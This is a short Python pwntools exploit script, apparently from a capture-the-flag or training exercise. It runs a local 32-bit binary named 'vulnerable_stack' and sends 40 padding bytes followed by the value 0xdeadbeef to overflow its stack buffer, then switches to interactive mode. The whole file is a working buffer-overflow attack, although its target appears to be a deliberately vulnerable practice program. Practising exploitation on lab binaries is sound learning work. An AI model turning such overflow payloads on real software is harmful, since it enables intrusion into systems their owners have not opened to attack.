from pwn import *
 
context.log_level = 'debug'

pwned= process('./vulnerable_stack/ELF_32/vulnerable_stack')

pwned.sendline('A' * 40  + '\xef\xbe\xad\xde')

pwned.interactive()
